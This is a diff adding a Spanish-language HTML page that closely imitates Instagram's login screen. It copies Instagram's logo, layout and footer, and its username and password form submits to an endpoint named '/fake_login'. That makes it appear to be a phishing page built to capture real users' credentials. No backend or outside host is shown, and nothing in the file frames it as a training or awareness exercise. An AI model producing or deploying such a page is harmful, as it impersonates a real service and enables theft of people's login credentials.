@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Inicio de Sesión de Instagram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: none;
+            list-style: none;
+            text-decoration: none;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background: #fafafa;
+            font-size: 14px;
+        }
+
+        .wrapper .header {
+            max-width: 350px;
+            width: 100%;
+            height: auto;
+            margin: 50px auto;
+        }
+
+        .wrapper .header .top,
+        .wrapper .signup {
+            background: #fff;
+            border: 1px solid #e6e6e6;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+        }
+
+        .wrapper .header .logo img {
+            display: block;
+            margin: 0 auto 35px;
+        }
+
+        .wrapper .header .form .input_field {
+            margin-bottom: 5px;
+        }
+
+        .wrapper .header .form .input_field .input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #efefef;
+            font-size: 12px;
+            border-radius: 3px;
+            color: #262626;
+            padding: 10px;
+        }
+
+        .wrapper .header .form .input_field .input:focus {
+            border: 1px solid #b2b2b2;
+        }
+
+        .wrapper .header .form .btn {
+            margin: 10px 0;
+            background-color: #3897f0;
+            border: 1px solid #3897f0;
+            border-radius: 4px;
+            text-align: center;
+            padding: 5px;
+        }
+
+        .wrapper .header .form .btn button {
+            color: #fff;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .wrapper .header .or {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 15px;
+            margin: 15px 0 20px;
+        }
+
+        .wrapper .header .or .line {
+            width: 105px;
+            height: 2px;
+            background: #efefef;
+        }
+
+        .wrapper .header .or p {
+            color: #999;
+            font-size: 12px;
+        }
+
+        .wrapper .dif .fb {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .wrapper .dif .fb img {
+            width: 16px;
+            height: 16px;
+        }
+
+        .wrapper .dif .fb p {
+            color: #385185;
+            font-weight: 500;
+            margin-left: 10px;
+        }
+
+        .wrapper .dif .forgot {
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .wrapper .dif .forgot a {
+            color: #003569;
+        }
+
+        .wrapper .signup {
+            margin: 10px 0 20px;
+            padding: 25px 40px;
+            text-align: center;
+            color: #262626;
+        }
+
+        .wrapper .signup a {
+            color: #3897f0;
+        }
+
+        .wrapper .apps {
+            text-align: center;
+            color: #262626;
+        }
+
+        .wrapper .apps p {
+            margin-bottom: 20px;
+        }
+
+        .wrapper .apps a img {
+            width: 135px;
+            height: 40px;
+            margin: 0 5px;
+        }
+
+        .footer {
+            max-width: 935px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 40px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .footer .links ul li {
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        .footer .links ul li a {
+            color: #003569;
+            font-size: 12px;
+        }
+
+        .footer .copyright {
+            color: #999;    
+        }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/640px-Instagram_logo.svg.png" alt="instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <form action="/fake_login" method="POST">
+                    <div class="input_field">
+                        <input type="text" name="username" placeholder="Número de teléfono, usuario o correo" class="input" required>
+                    </div>
+                    <div class="input_field">
+                        <input type="password" name="password" placeholder="Contraseña" class="input" required>
+                    </div>
+                    <div class="btn">
+                        <button type="submit">Iniciar sesión</button>
+                    </div>
+                </form>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>O</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Facebook_icon_2013.svg" alt="facebook">
+                    <p>Iniciar sesión con Facebook</p>
+                </div>
+                <div class="forgot">
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
+        </div>
+        <div class="apps">
+            <p>Obtén la aplicación.</p>
+            <div class="icons">
+                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Google_Play_Store_badge_IT.svg/640px-Google_Play_Store_badge_IT.svg.png" alt="appstore"></a>
+                <a href="#"><img src="https://money.pro/es/img/windows-badge.png" alt="googleplay"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="#">SOBRE NOSOTROS</a></li>
+                <li><a href="#">AYUDA</a></li>
+                <li><a href="#">NOTICIAS</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">EMPLEOS</a></li>
+                <li><a href="#">PRIVACIDAD</a></li>
+                <li><a href="#">TÉRMINOS</a></li>
+                <li><a href="#">DIRECTORIO</a></li>
+                <li><a href="#">PERFILES</a></li>
+                <li><a href="#">HASHTAGS</a></li>
+                <li><a href="#">IDIOMA</a></li>
+            </ul>
+        </div>
+        <div class="copyright">
+            © 2019 INSTAGRAM
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
